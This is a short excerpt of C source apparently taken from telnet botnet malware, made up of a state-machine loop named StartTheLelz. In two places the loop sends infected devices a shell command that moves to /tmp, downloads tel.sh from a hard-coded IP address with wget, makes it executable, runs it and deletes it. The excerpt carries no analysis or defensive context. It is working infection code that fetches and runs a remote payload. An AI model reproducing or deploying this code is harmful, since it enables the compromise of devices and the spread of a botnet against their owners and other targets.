 ...
 void StartTheLelz()
 {
	 ...
	 while(1)
	 {
		 for(i = 0; i < max; i++)
		 {
			 ...
			 case 8:
				 {
					 if(send(fds[i].fd, "cd /tmp; wget -q http://89.163.219.26/tel.sh; chmod 777 tel.sh; sh tel.sh; rm -rf tel.sh\r\n", 81, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					 fds[i].state = 9;
				 }
				 break;
			 ...
			 case 101:
				 {
					 if(send(fds[i].fd, "cd /tmp; wget -q http://89.163.219.26/tel.sh; chmod 777 tel.sh; sh tel.sh; rm -f *.sh\r\n", 81, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					 fds[i].state = 102;
				 }
				 break;
